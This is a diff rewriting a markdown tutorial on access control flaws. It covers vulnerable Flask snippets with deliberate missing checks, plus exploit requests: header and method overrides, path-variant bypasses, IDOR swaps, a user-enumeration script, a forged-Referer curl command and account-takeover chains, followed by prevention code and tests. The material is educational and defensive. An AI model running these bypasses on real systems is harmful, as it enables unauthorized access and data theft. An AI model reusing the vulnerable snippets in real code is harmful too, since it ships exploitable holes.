@@ -1,338 +1,955 @@
 # Access control vulnerabilities and privilege escalation
 
-Access control decides what an authenticated user is allowed to do, and broken access control is one of the most common ways attackers read, modify, or delete data they shouldn’t. This usually shows up as **privilege escalation** (gaining more power) or object-level access issues (accessing other users’ stuff).
+Access control vulnerabilities occur when applications fail to properly restrict what authenticated users can do or what resources they can access. These flaws enable attackers to view, modify, or delete data they shouldn't access, escalate from regular users to administrators, or perform actions beyond their authorized scope. Despite being conceptually simple, broken access control remains one of the most critical and common vulnerability classes because proper implementation requires consistent enforcement across every endpoint, function, and data object.
 
-> Only test applications you own or are explicitly authorized to assess.
+Access control sits at the intersection of authentication (who you are) and authorization (what you're allowed to do)—one confirms identity, the other enforces permissions.
 
-## Access control types (what you’re trying to break)
+> Only test systems you own or are explicitly authorized to assess.
 
-- Vertical access control: restricts *functions* by role (user vs admin vs manager).  
-- Horizontal access control: restricts *resources* by ownership (your invoice vs someone else’s invoice).  
-- Context-dependent access control: restricts actions based on workflow/state (e.g., “can’t change cart after payment”).
+## What is access control? (fundamentals)
 
-In practice you should assume every endpoint needs both:
-- Authentication (who are you?)
-- Authorization (are you allowed to do this *right now*, to *this object*, using *this method*?)
+### The three pillars of application security
 
-## Common broken access control patterns (with exploit-style examples)
+**1) Authentication:** Proves user identity
+```
+User submits: username + password
+System verifies: credentials match database
+Result: User identity confirmed
+```
 
-### 1) Unprotected admin functionality (direct URL access)
-Classic: admin links aren’t shown to normal users, but the URL itself isn’t protected server-side.
+**2) Session management:** Tracks authenticated users across requests
+```
+User logs in → Server issues session token
+Subsequent requests include token
+Server validates token → identifies user
+```
 
+**3) Access control (authorization):** Enforces what users can do
+```
+User requests: DELETE /api/users/123
+System checks: Does this user have permission?
+Result: Allow or deny the action
+```
+
+**All three must work together:**
+- Authentication without access control = Everyone authenticated can do everything
+- Session management without access control = Sessions tracked but permissions not enforced
+- Access control without authentication = No way to identify who's making requests
+
+### Types of access control
+
+#### Vertical access control (privilege levels)
+Different user types have different capabilities:
+```
+Administrator:
+  - Create/delete users
+  - Modify system settings
+  - Access all data
+  - View audit logs
+
+Manager:
+  - View team data
+  - Approve requests
+  - Generate reports
+
+Employee:
+  - View own data
+  - Submit requests
+  - Update own profile
+```
+
+#### Horizontal access control (same privilege, different data)
+Users at same level can only access their own resources:
+```
+Customer A can access:
+  - Their account (/account?id=123)
+  - Their orders (/orders?user=123)
+  - Their payment methods
+
+Customer B can access:
+  - Their account (/account?id=456)
+  - Their orders (/orders?user=456)
+  - Their payment methods
+
+But Customer A CANNOT access Customer B's data (and vice versa)
+```
+
+#### Context-dependent access control (workflow state)
+Access depends on application state or workflow position:
+```
+E-commerce workflow:
+1. Add items to cart ✓ (allowed)
+2. Proceed to checkout ✓ (allowed)
+3. Enter payment ✓ (allowed)
+4. Complete purchase ✓ (allowed)
+5. Modify cart ✗ (not allowed - order finalized)
+
+Document approval workflow:
+Draft → Can edit
+Submitted → Cannot edit, can only approve/reject
+Approved → Read-only, cannot modify
+```
+
+## Vertical privilege escalation (accessing admin functions)
+
+### Vulnerability 1: Unprotected admin functionality
+
+**Scenario:** Admin pages accessible by URL but not linked for regular users.
+
+**Vulnerable implementation:**
+```python
+# Admin page - NO authentication check!
+@app.route('/admin')
+def admin_panel():
+    return render_template('admin.html')
+
+@app.route('/admin/delete-user')
+def delete_user():
+    user_id = request.args.get('id')
+    User.query.filter_by(id=user_id).delete()
+    return "User deleted"
+```
+
+**User interface logic:**
+```html
+<!-- Regular user sees: -->
+<nav>
+  <a href="/dashboard">Dashboard</a>
+  <a href="/profile">Profile</a>
+</nav>
+
+<!-- Admin user sees: -->
+<nav>
+  <a href="/dashboard">Dashboard</a>
+  <a href="/profile">Profile</a>
+  <a href="/admin">Admin Panel</a>  <!-- Only shown to admins -->
+</nav>
+```
+
+**Problem:** Admin pages not shown in UI for regular users, but URL is still accessible!
+
+**Exploitation:**
 ```http
 GET /admin HTTP/1.1
-Host: target.tld
-Cookie: session=...
+Host: vulnerable.com
+Cookie: session=regular_user_session
+
+Response: 200 OK (Admin panel accessible!)
 ```
 
-What to test:
-- Try common admin paths: `/admin`, `/administrator`, `/admin-panel`, `/manage`, `/console`.
-- Check “hidden” paths leaked via `/robots.txt`, JS bundles, or sitemaps.
-- Don’t trust “security by obscurity” URLs—if the server doesn’t enforce role checks, the URL being “random” doesn’t matter.
+**Discovery via robots.txt:**
+```
+# https://example.com/robots.txt
+User-agent: *
+Disallow: /admin/
+Disallow: /admin-panel/
+Disallow: /administrator/
+```
 
-### 2) “Security by obscurity” admin URLs leaked in client-side JavaScript
-Even if the admin URL is not guessable, it can leak to all users via static JS.
+Attacker visits `/admin/` directly → gains admin access.
 
-Example anti-pattern:
+### Vulnerability 2: Security through obscurity
+
+**Scenario:** Admin URL is "hidden" with unpredictable name.
+
+**Vulnerable implementation:**
+```python
+# Admin at obscure URL
+@app.route('/administrator-panel-yb556')
+def secret_admin():
+    return render_template('admin.html')
+```
+
+**JavaScript leak in client-side code:**
+```javascript
+// main.js - Loaded by ALL users
+var isAdmin = false;
+
+if (isAdmin) {
+    var adminPanelTag = document.createElement('a');
+    adminPanelTag.setAttribute('href', '/administrator-panel-yb556');
+    adminPanelTag.innerText = 'Admin panel';
+    document.body.appendChild(adminPanelTag);
+}
+```
+
+**Exploitation:**
+1. Regular user views page source
+2. Finds JavaScript containing admin URL
+3. Navigates directly to `/administrator-panel-yb556`
+4. Gains admin access
+
+**Other disclosure methods:**
 ```html
-<script>
-  var isAdmin = false;
-  if (isAdmin) {
-    window.location = "/administrator-panel-yb556";
-  }
-</script>
+<!-- HTML comments -->
+<!-- Admin panel: /admin-secret-xk9p2 -->
+
+<!-- Disabled links -->
+<a href="/admin-v2-secure" style="display:none">Admin</a>
+
+<!-- Error messages -->
+Error: Could not find /admin-xk9p2/users
 ```
 
-What to test:
-- Search JS for: `admin`, `isAdmin`, `role`, `administrator`, `panel`, `manage`, `deleteUser`.
-- Request the discovered endpoint directly and confirm server-side enforcement.
+### Vulnerability 3: Parameter-based access control
 
-### 3) Parameter-based access control (role stored in user-controllable data)
-If the app stores role in a cookie, hidden field, or query param, it’s usually game over.
+**Scenario:** User role stored in cookie or URL parameter.
 
-Bad patterns:
+**Vulnerable implementation (cookie-based):**
+```python
+@app.route('/admin')
+def admin_panel():
+    is_admin = request.cookies.get('admin')
+    
+    if is_admin == 'true':  # Trusting client-side value!
+        return render_admin_panel()
+    else:
+        return "Access denied", 403
+```
+
+**Exploitation:**
 ```http
-GET /login/home?admin=true HTTP/1.1
+GET /admin HTTP/1.1
+Host: vulnerable.com
+Cookie: session=user123; admin=true
+
+Response: 200 OK (Admin panel accessible!)
 ```
 
+**Vulnerable implementation (URL parameter):**
+```python
+@app.route('/login')
+def login():
+    # After successful authentication
+    if user.is_admin:
+        return redirect('/home?admin=true')
+    else:
+        return redirect('/home?admin=false')
+
+@app.route('/admin')
+def admin():
+    is_admin = request.args.get('admin')
+    if is_admin == 'true':
+        return render_admin_panel()
+```
+
+**Exploitation:**
 ```http
-GET /login/home?role=1 HTTP/1.1
+GET /admin?admin=true HTTP/1.1
+
+Response: 200 OK (Instant admin access!)
 ```
 
+### Vulnerability 4: Role stored in modifiable profile
+
+**Scenario:** User role in editable profile field.
+
+**Vulnerable flow:**
+```python
+@app.route('/profile/update', methods=['POST'])
+def update_profile():
+    user_id = session['user_id']
+    email = request.json.get('email')
+    roleid = request.json.get('roleid')  # Should not be user-editable!
+    
+    user = User.query.get(user_id)
+    user.email = email
+    user.roleid = roleid  # Oops! User can change their own role
+    db.session.commit()
+    
+    return "Profile updated"
+```
+
+**Exploitation:**
 ```http
-Cookie: role=admin
+POST /profile/update HTTP/1.1
+Content-Type: application/json
+
+{
+  "email": "attacker@evil.com",
+  "roleid": 2
+}
+
+# roleid 1 = regular user
+# roleid 2 = administrator
 ```
 
-```html
-<input type="hidden" name="role" value="user">
+After update, attacker has admin privileges.
+
+### Vulnerability 5: Platform misconfiguration bypasses
+
+#### Bypass 1: URL override headers
+
+**Vulnerable configuration:**
+```
+# Access control rule
+DENY POST /admin/deleteUser for non-admins
 ```
 
-What to test:
-- Change role-like values: `user -> admin`, `0 -> 1`, `false -> true`.
-- Look for “role” fields in profile update endpoints:
-```http
-POST /my-account/change-details
-Content-Type: application/x-www-form-urlencoded
-
-email=a@b.com&role=admin
-```
-
-Correct design:
-- Role/permissions must come from a server-side source of truth (session store / DB / signed token with strict validation), not client-controlled fields.
-
-### 4) Platform / proxy misconfiguration (URL override headers)
-Some stacks let a header override the effective route, which can bypass URL-based restrictions at the front door.
-
-Example bypass pattern:
+**Bypass with X-Original-URL:**
 ```http
 POST / HTTP/1.1
-Host: target.tld
+Host: vulnerable.com
 X-Original-URL: /admin/deleteUser
-Cookie: session=...
-Content-Type: application/x-www-form-urlencoded
 
-username=carlos
+user_id=123
+
+# Access control checks "/" (allowed)
+# Application routes to "/admin/deleteUser" (restricted function executed!)
 ```
 
-Also check:
+**Alternative headers:**
 ```http
+X-Original-URL: /admin/deleteUser
 X-Rewrite-URL: /admin/deleteUser
-X-Forwarded-Uri: /admin/deleteUser
-X-Forwarded-Path: /admin/deleteUser
+X-Custom-IP-Authorization: 127.0.0.1
 ```
 
-What to test:
-- If `/admin/deleteUser` is blocked, try hitting `/` (or another allowed path) while setting override headers.
-- Compare responses carefully (status code, body, side effects).
+#### Bypass 2: HTTP method override
 
-### 5) Method-based bypass (GET does what only POST should)
-Front-end controls often restrict `POST /admin/deleteUser`, but the back-end might accept `GET` too.
+**Vulnerable configuration:**
+```
+# Access control rule
+DENY POST /admin/deleteUser for non-admins
+```
 
+**If application accepts GET for same function:**
 ```http
-GET /admin/deleteUser?username=carlos HTTP/1.1
-Host: target.tld
-Cookie: session=...
+# Blocked:
+POST /admin/deleteUser HTTP/1.1
+user_id=123
+
+# Bypassed:
+GET /admin/deleteUser?user_id=123 HTTP/1.1
+
+# Also try:
+DELETE /admin/deleteUser HTTP/1.1
+PUT /admin/deleteUser HTTP/1.1
 ```
 
-Also try:
-- `PUT`, `PATCH`, `DELETE`, `HEAD`
-- Method override patterns:
+**Method override headers:**
 ```http
 POST /admin/deleteUser HTTP/1.1
-X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: GET
+user_id=123
 ```
 
-### 6) URL-matching discrepancies (case, suffixes, slashes)
-Authorization checks and routing may disagree on what counts as the “same” path.
+#### Bypass 3: URL-matching discrepancies
 
-Try variations:
-```text
-/admin/deleteUser
-/ADMIN/DELETEUSER
-/admin/deleteUser/
-/admin/deleteUser;/
-/admin/deleteUser.anything
-/admin/%2e%2e/admin/deleteUser
+**Case sensitivity:**
+```http
+# Blocked:
+GET /admin/deleteUser HTTP/1.1
+
+# Bypassed:
+GET /ADMIN/DELETEUSER HTTP/1.1
+GET /Admin/DeleteUser HTTP/1.1
+GET /admin/DELETEuser HTTP/1.1
 ```
 
-What to look for:
-- A path that routes to the protected handler but is not covered by the access-control rule.
+**Trailing slash:**
+```http
+# Blocked:
+GET /admin/deleteUser HTTP/1.1
 
-### 7) Horizontal privilege escalation (IDOR)
-If you can change an object identifier and access another user’s resource, that’s a horizontal access control failure.
+# Bypassed:
+GET /admin/deleteUser/ HTTP/1.1
+```
 
-Query param example:
+**Spring Framework suffix pattern (pre-5.3):**
+```http
+# Blocked:
+GET /admin/deleteUser HTTP/1.1
+
+# Bypassed:
+GET /admin/deleteUser.anything HTTP/1.1
+GET /admin/deleteUser.php HTTP/1.1
+GET /admin/deleteUser.jsp HTTP/1.1
+```
+
+## Horizontal privilege escalation (accessing other users' data)
+
+### Vulnerability 1: Basic IDOR (Insecure Direct Object Reference)
+
+**Scenario:** User ID in URL allows direct access to resources.
+
+**Vulnerable implementation:**
+```python
+@app.route('/myaccount')
+def my_account():
+    user_id = request.args.get('id')
+    
+    # NO check if user_id matches logged-in user!
+    user = User.query.get(user_id)
+    
+    return render_template('account.html', user=user)
+```
+
+**Normal usage:**
 ```http
 GET /myaccount?id=123 HTTP/1.1
-Cookie: session=...
+Cookie: session=user123_session
+
+Response: Shows user 123's account (your account)
 ```
 
-Path param example:
+**Exploitation:**
 ```http
-GET /users/123/profile HTTP/1.1
-Cookie: session=...
+GET /myaccount?id=456 HTTP/1.1
+Cookie: session=user123_session
+
+Response: Shows user 456's account (someone else's!)
 ```
 
-JSON body example:
+**Enumerate all users:**
+```python
+import requests
+
+session = "user123_session"
+
+for user_id in range(1, 1000):
+    r = requests.get(
+        f"https://target.com/myaccount?id={user_id}",
+        cookies={"session": session}
+    )
+    
+    if r.status_code == 200:
+        print(f"User {user_id}: {extract_email(r.text)}")
+```
+
+### Vulnerability 2: IDOR with unpredictable IDs (GUID)
+
+**Scenario:** User IDs are GUIDs, not sequential numbers.
+
+**Vulnerable implementation:**
+```python
+@app.route('/user/<guid>')
+def user_profile(guid):
+    user = User.query.filter_by(guid=guid).first()
+    
+    # Still no authorization check!
+    return render_template('profile.html', user=user)
+```
+
+**Challenge:** Can't guess GUIDs (e.g., `a1b2c3d4-e5f6-7890-abcd-ef1234567890`)
+
+**But GUIDs leaked elsewhere:**
+```html
+<!-- Blog post comments -->
+<div class="comment">
+  <a href="/user/a1b2c3d4-e5f6-7890-abcd-ef1234567890">admin_user</a>
+  said: "Great article!"
+</div>
+
+<div class="comment">
+  <a href="/user/f9e8d7c6-b5a4-3210-9876-fedcba098765">ceo</a>
+  said: "Thanks for sharing!"
+</div>
+```
+
+**Exploitation:**
+1. Browse site, collect GUIDs from comments, reviews, posts
+2. Access each GUID: `/user/<collected_guid>`
+3. View sensitive profile data for high-value users
+
+### Vulnerability 3: Data leakage in redirect
+
+**Scenario:** App redirects unauthorized access but response includes sensitive data.
+
+**Vulnerable implementation:**
+```python
+@app.route('/myaccount')
+def my_account():
+    user_id = request.args.get('id')
+    logged_in_user = session.get('user_id')
+    
+    user = User.query.get(user_id)
+    
+    # Check authorization AFTER fetching data
+    if user_id != logged_in_user:
+        response = make_response(redirect('/login'))
+        response.set_cookie('error', 'Unauthorized access')
+        # But data already rendered in response body!
+        return response, 302
+    
+    return render_template('account.html', user=user)
+```
+
+**Exploitation:**
 ```http
-POST /api/invoices/view
-Content-Type: application/json
-Cookie: session=...
+GET /myaccount?id=456 HTTP/1.1
+Cookie: session=user123_session
 
-{"invoiceId": 123}
+Response: 302 Redirect
+Location: /login
+Set-Cookie: error=Unauthorized access
+
+<html>
+<body>
+  <!-- Sensitive data visible in response body before redirect! -->
+  <h1>Account: admin@company.com</h1>
+  <p>API Key: sk_live_4eC39HqLyjWDarjtT1zdp7dc</p>
+  <p>Balance: $50,000</p>
+</body>
+</html>
 ```
 
-What to test:
-- Increment/decrement numeric IDs: `123 -> 124`.
-- Swap UUIDs if you can learn them elsewhere (messages, reviews, filenames, API responses).
-- Test every object type: invoices, orders, messages, addresses, tickets, documents.
+**Browser redirects** but attacker intercepts full response with Burp Suite → sees sensitive data.
 
-Correct control:
-- Always authorize based on *ownership/relationship*, not just “is logged in”.
+### Vulnerability 4: IDOR in API endpoints
 
-### 8) Data leakage in redirects (still leaking on 302/401)
-Sometimes the app “blocks” with a redirect to login, but the response body already contains sensitive data.
+**Scenario:** Web UI has proper access control, but API doesn't.
 
-Check:
-- The body of `302` responses.
-- Cached responses in intermediate proxies.
-- API responses that include data before failing an auth check.
+**Web UI (secure):**
+```python
+@app.route('/dashboard')
+@login_required
+def dashboard():
+    user = current_user  # From session
+    orders = Order.query.filter_by(user_id=user.id).all()
+    return render_template('dashboard.html', orders=orders)
+```
 
-### 9) Horizontal → vertical escalation (target a privileged account)
-A horizontal bug becomes vertical when the “other user” is an admin or can perform admin-only actions.
+**API endpoint (insecure):**
+```python
+@app.route('/api/orders')
+def api_orders():
+    user_id = request.args.get('user_id')  # From parameter!
+    
+    # No authorization check!
+    orders = Order.query.filter_by(user_id=user_id).all()
+    
+    return jsonify(orders)
+```
 
-Attack path patterns:
-- Access an admin’s profile via IDOR and steal API keys.
-- Trigger password reset flows for another user.
-- Modify another user’s email/2FA settings if ownership checks are weak.
-
-### 10) Multi-step process gaps (missing authZ on one step)
-Apps often secure step 1 and 2 but forget step 3 (the “confirm/submit” endpoint).
-
-Example flow:
-1) `GET /admin/user/123/edit` (protected)
-2) `POST /admin/user/123/edit` (protected)
-3) `POST /admin/user/123/confirm` (missing check)
-
-Exploit idea: call step 3 directly.
+**Exploitation:**
 ```http
-POST /admin/user/123/confirm HTTP/1.1
-Cookie: session=lowpriv
-Content-Type: application/x-www-form-urlencoded
+GET /api/orders?user_id=456 HTTP/1.1
 
-email=attacker@tld&role=admin
+Response: 200 OK
+[
+  {"order_id": 789, "total": 250.00, "items": [...]}
+]
 ```
 
-Fix:
-- Enforce authorization at **every** step, and validate the workflow state server-side.
+Access any user's orders via API despite UI protection.
 
-### 11) Referer-based access control (trusting a client header)
-If access is allowed just because `Referer` looks like `/admin`, that’s bypassable because the header is attacker-controlled.
+## Horizontal to vertical privilege escalation
 
+### Technique: IDOR → Password disclosure → Admin access
+
+**Step 1: IDOR to access admin profile**
 ```http
-POST /admin/deleteUser HTTP/1.1
-Host: target.tld
-Cookie: session=lowpriv
-Referer: https://target.tld/admin
-Content-Type: application/x-www-form-urlencoded
+GET /account?id=1 HTTP/1.1
+Cookie: session=user123_session
 
-username=carlos
+Response:
+<html>
+  <h1>Admin Account</h1>
+  <form action="/update-profile">
+    <input name="email" value="admin@company.com">
+    <input name="password" value="AdminPass123!">  <!-- Password visible! -->
+  </form>
+</html>
 ```
 
-### 12) Location-based access control (geo restrictions)
-Geo-based controls can often be bypassed via VPN/proxy or client-side location manipulation if the server doesn’t verify robustly.
+**Step 2: Use disclosed password to login as admin**
+```http
+POST /login HTTP/1.1
 
-Tests:
-- Access from different egress IPs.
-- Look for “trusted” headers like `X-Forwarded-For` being blindly accepted.
+username=admin@company.com&password=AdminPass123!
 
-## How to test systematically (a repeatable checklist)
-
-### 1) Build an “authorization matrix”
-List:
-- Roles (anon, user, manager, admin)
-- Resources (orders, invoices, users, admin actions)
-- Actions (read/create/update/delete/export)
-
-Then verify each (role, resource, action) combination.
-
-### 2) Test every endpoint, not every page
-Access control is about requests. For each sensitive action:
-- Repeat the request as a lower-priv user.
-- Repeat with a different object ID (owned by another user).
-- Repeat with method variations.
-
-### 3) Prefer object-level testing everywhere
-Even if an endpoint is “admin-only”, still test object-level rules:
-- Can Admin A access Admin B’s secrets?
-- Can Support read all users’ data, or only assigned tickets?
-
-### 4) Validate “deny by default”
-Try:
-- Unknown endpoints close to real ones.
-- Alternate paths and suffixes.
-- Missing required parameters (sometimes “falls back” to a default object).
-
-## Prevention (defense-in-depth that works)
-
-### Core principles
-- Deny by default: everything is forbidden unless explicitly allowed.
-- Centralize authorization: one mechanism applied consistently across the app.
-- Validate permissions on every request: no “we checked earlier in the workflow”.
-- Never trust client-side enforcement: UI hiding is not security.
-
-### Implementation patterns (examples)
-
-#### 1) Server-side policy checks (pseudo-code)
-```text
-authorize(user, action, resource):
-  if user is null: deny
-  if not policy.allows(user, action, resource): deny
-  allow
+Response: 302 Redirect to /admin-dashboard
 ```
 
-Object-level check example:
-```text
-GET /invoices/{invoiceId}
-invoice = db.get(invoiceId)
-if invoice.ownerId != currentUser.id and not currentUser.hasRole("ADMIN"):
-  return 403
-return invoice
+**Step 3: Now have full admin privileges**
+
+### Technique: IDOR → Password reset → Account takeover
+
+**Step 1: Access admin's account page via IDOR**
+```http
+GET /account?id=1 HTTP/1.1
+
+Response:
+<form action="/reset-password">
+  <input type="hidden" name="user_id" value="1">
+  <input type="password" name="new_password">
+  <button>Change Password</button>
+</form>
 ```
 
-#### 2) Use ABAC/ReBAC concepts for “real” rules
-Instead of only RBAC (“admin vs user”), include attributes/relationships:
-- Owner of resource
-- Same tenant/org
-- Time-of-day, location, device trust (when required)
-- “Created-by” relationship
+**Step 2: Submit password reset for admin**
+```http
+POST /reset-password HTTP/1.1
 
-Example policy idea:
-```text
-Allow "refund" if user.role in {FINANCE} AND invoice.tenant == user.tenant AND invoice.state == "PAID"
+user_id=1&new_password=NewPass123!
+
+Response: Password updated successfully
 ```
 
-#### 3) Secure static resources too
-Don’t assume “static” equals “public”. If documents are sensitive:
-- Serve via an authenticated controller that checks authorization.
-- Use time-limited signed URLs only after authorization.
+**Step 3: Login as admin with new password**
 
-#### 4) Handle authorization failures safely
-- Return 403 (or a generic 404 if you intentionally hide existence).
-- Don’t include sensitive data in error bodies or redirects.
-- Don’t “partially execute” an action before failing.
+## Multi-step process vulnerabilities
 
-#### 5) Logging and detection (make exploitation visible)
-Log:
-- Authorization denials (who, what endpoint, what object).
-- High-rate ID changes (IDOR probing).
-- Access to admin endpoints by non-admin roles.
-- Method override/header override attempts.
+### Scenario: Flawed workflow enforcement
 
-## Quick tester payload set (copy/paste)
-
-Path variants:
-```text
-/admin
-/admin/
-/ADMIN
-/admin;/
-/admin/deleteUser
-/admin/deleteUser/
-/admin/deleteUser.anything
+**Intended workflow (admin updating user):**
+```
+Step 1: GET  /admin/update-user?user_id=123  (load form)
+Step 2: POST /admin/update-user-confirm       (submit changes)
+Step 3: POST /admin/update-user-finalize      (confirm changes)
 ```
 
-Header overrides:
-```text
-X-Original-URL: /admin/deleteUser
-X-Rewrite-URL: /admin/deleteUser
-X-HTTP-Method-Override: DELETE
-Referer: https://target.tld/admin
+**Access control:**
+```python
+# Step 1 - Protected
+@app.route('/admin/update-user')
+@require_admin
+def load_form():
+    return render_form()
+
+# Step 2 - Protected
+@app.route('/admin/update-user-confirm', methods=['POST'])
+@require_admin
+def confirm_changes():
+    return render_confirmation()
+
+# Step 3 - NOT Protected!
+@app.route('/admin/update-user-finalize', methods=['POST'])
+def finalize_changes():
+    # Assumes user already passed steps 1 and 2
+    user_id = request.form['user_id']
+    new_role = request.form['role']
+    
+    user = User.query.get(user_id)
+    user.role = new_role
+    db.session.commit()
 ```
 
-IDOR swaps:
-```text
-?id=123 -> ?id=124
-/users/123 -> /users/124
-{"invoiceId":123} -> {"invoiceId":124}
+**Exploitation (skip steps 1 and 2):**
+```http
+POST /admin/update-user-finalize HTTP/1.1
+Cookie: session=regular_user_session
+
+user_id=999&role=administrator
+
+Response: Changes saved successfully
+```
+
+Regular user escalates directly to admin by skipping protected steps.
+
+## Referer-based access control
+
+### Vulnerability: Trusting Referer header
+
+**Vulnerable implementation:**
+```python
+@app.route('/admin')
+@require_admin
+def admin_panel():
+    return render_template('admin.html')
+
+@app.route('/admin/deleteUser')
+def delete_user():
+    referer = request.headers.get('Referer')
+    
+    # Only checks if request came from /admin page
+    if referer and '/admin' in referer:
+        user_id = request.args.get('id')
+        User.query.filter_by(id=user_id).delete()
+        return "User deleted"
+    else:
+        return "Access denied", 403
+```
+
+**Exploitation (forge Referer header):**
+```http
+GET /admin/deleteUser?id=123 HTTP/1.1
+Host: vulnerable.com
+Cookie: session=regular_user_session
+Referer: https://vulnerable.com/admin
+
+Response: User deleted
+```
+
+**Automated with curl:**
+```bash
+curl https://vulnerable.com/admin/deleteUser?id=123 \
+  -H "Referer: https://vulnerable.com/admin" \
+  -b "session=regular_user_session"
+```
+
+Regular user can perform admin actions by forging Referer.
+
+## Real-world exploitation examples
+
+### Example 1: Facebook IDOR (historical)
+
+**Vulnerability:** Delete any photo via graph API
+
+**Normal usage:**
+```http
+DELETE /v1.0/photos/12345 HTTP/1.1
+Authorization: Bearer user_token
+
+# Deletes your own photo
+```
+
+**Exploitation:**
+```http
+DELETE /v1.0/photos/67890 HTTP/1.1
+Authorization: Bearer user_token
+
+# Deletes someone else's photo!
+```
+
+No check if photo 67890 belonged to authenticated user.
+
+### Example 2: PayPal account takeover
+
+**Vulnerability:** Change email for any account
+
+**Exploitation:**
+```http
+POST /myaccount/settings/email HTTP/1.1
+
+account_id=victim@paypal.com&new_email=attacker@evil.com
+```
+
+No validation that `account_id` matched logged-in user.
+
+### Example 3: Uber trip history access
+
+**Vulnerability:** View any rider's trip history
+
+**Normal:**
+```http
+GET /api/trips?user_id=USER123 HTTP/1.1
+Authorization: Bearer USER123_token
+
+# Returns USER123's trips
+```
+
+**Exploitation:**
+```http
+GET /api/trips?user_id=VICTIM456 HTTP/1.1
+Authorization: Bearer USER123_token
+
+# Returns VICTIM456's trips (addresses, names, times)
+```
+
+### Example 4: Admin password in HTML
+
+**Discovery:**
+```http
+GET /admin/settings HTTP/1.1
+Cookie: session=regular_user_session
+
+Response: 403 Forbidden
+```
+
+**Try IDOR:**
+```http
+GET /account?id=1 HTTP/1.1
+Cookie: session=regular_user_session
+
+Response: 200 OK
+<input type="text" name="username" value="admin">
+<input type="password" name="password" value="SecureAdmin2024!">
+```
+
+Password visible in value attribute → login as admin.
+
+## Prevention strategies
+
+### 1) Deny by default
+
+**Bad - Allowlist specific denials:**
+```python
+def check_access(user, resource):
+    # Deny only specific cases
+    if resource == '/admin' and not user.is_admin:
+        return False
+    
+    return True  # Allow everything else
+```
+
+**Good - Deny by default:**
+```python
+def check_access(user, resource):
+    # Deny everything by default
+    allowed_resources = get_user_permissions(user)
+    
+    if resource in allowed_resources:
+        return True
+    
+    return False  # Deny if not explicitly allowed
+```
+
+### 2) Never use client-side values for authorization
+
+**Bad:**
+```python
+is_admin = request.cookies.get('admin')
+role = request.args.get('role')
+user_id = request.form['user_id']
+```
+
+**Good:**
+```python
+# Get everything from server-side session
+user_id = session['user_id']
+is_admin = session['is_admin']
+role = session['role']
+
+# Or query database
+user = get_user_from_session()
+is_admin = user.is_admin
+```
+
+### 3) Implement centralized access control
+
+**Bad - Scattered checks:**
+```python
+@app.route('/admin/users')
+def admin_users():
+    if not current_user.is_admin:
+        return "Forbidden", 403
+    # ...
+
+@app.route('/admin/settings')
+def admin_settings():
+    if current_user.role != 'admin':
+        return "Access denied", 403
+    # ...
+```
+
+**Good - Centralized decorator:**
+```python
+def require_role(role):
+    def decorator(f):
+        @wraps(f)
+        def wrapped(*args, **kwargs):
+            if not has_role(current_user, role):
+                return "Access denied", 403
+            return f(*args, **kwargs)
+        return wrapped
+    return decorator
+
+@app.route('/admin/users')
+@require_role('admin')
+def admin_users():
+    # Authorization handled centrally
+    pass
+
+@app.route('/admin/settings')
+@require_role('admin')
+def admin_settings():
+    pass
+```
+
+### 4) Check authorization on every request
+
+**Vulnerable:**
+```python
+@app.route('/view-document/<doc_id>')
+def view_document(doc_id):
+    document = Document.query.get(doc_id)
+    return render_template('document.html', doc=document)
+```
+
+**Secure:**
+```python
+@app.route('/view-document/<doc_id>')
+@login_required
+def view_document(doc_id):
+    document = Document.query.get(doc_id)
+    
+    # Check user owns or has permission for this specific document
+    if not user_can_access_document(current_user, document):
+        return "Access denied", 403
+    
+    return render_template('document.html', doc=document)
+
+def user_can_access_document(user, document):
+    # Check ownership
+    if document.owner_id == user.id:
+        return True
+    
+    # Check if document shared with user
+    if document.id in user.shared_documents:
+        return True
+    
+    # Check admin override
+    if user.is_admin:
+        return True
+    
+    return False
+```
+
+### 5) Use object-level permissions
+
+**Database model with ownership:**
+```python
+class Document(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    title = db.Column(db.String(200))
+    content = db.Column(db.Text)
+    owner_id = db.Column(db.Integer, db.ForeignKey('user.id'))
+    
+    # Relationship
+    owner = db.relationship('User', backref='documents')
+    
+    def can_access(self, user):
+        return self.owner_id == user.id or user.is_admin
+    
+    def can_modify(self, user):
+        return self.owner_id == user.id
+```
+
+**Usage:**
+```python
+@app.route('/document/<int:doc_id>/edit', methods=['POST'])
+@login_required
+def edit_document(doc_id):
+    document = Document.query.get_or_404(doc_id)
+    
+    # Object-level permission check
+    if not document.can_modify(current_user):
+        return "Access denied", 403
+    
+    document.content = request.form['content']
+    db.session.commit()
+    
+    return "Document updated"
+```
+
+### 6) Audit and test access controls
+
+**Automated testing:**
+
+```python
+def test_access_control():
+    # Create test users
+    admin = create_test_user(role='admin')
+    user1 = create_test_user(role='user')
+    user2 = create_test_user(role='user')
+    
+    # Test 1: User cannot access admin endpoints
+    response = client.get('/admin', headers=auth_header(user1))
+    assert response.status_code == 403
+    
+    # Test 2: User cannot access other user's data
+    response = client.get(f'/account?id={user2.id}', 
+                         headers=auth_header(user1))
+    assert response.status_code == 403
+    
+    # Test 3: User can access own data
+    response = client.get(f'/account?id={user1.id}',
+                         headers=auth_header(user1))
+    assert response.status_code == 200
+    
+    # Test 4: Admin can access admin endpoints
+    response = client.get('/admin', headers=auth_header(admin))
+    assert response.status_code == 200
 ```
